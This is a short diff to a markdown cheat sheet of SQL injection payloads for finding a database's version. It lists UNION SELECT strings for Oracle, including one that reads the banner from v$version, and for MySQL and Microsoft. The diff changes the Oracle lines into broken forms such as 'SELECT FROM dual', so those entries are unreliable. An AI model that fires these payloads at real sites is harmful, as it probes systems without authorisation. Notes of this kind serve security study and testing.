@@ -4,8 +4,8 @@
 **Database version**
 
 for oracle---
-'+UNION+SELECT+'abc','def'+FROM+dual--
-'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+'+UNION+SELECT+FROM+dual--
+'+UNION+SELECT+BANNER+FROM+v$version--
 
 for MySQL and Microsoft---
 '+UNION+SELECT+'abc','def'#
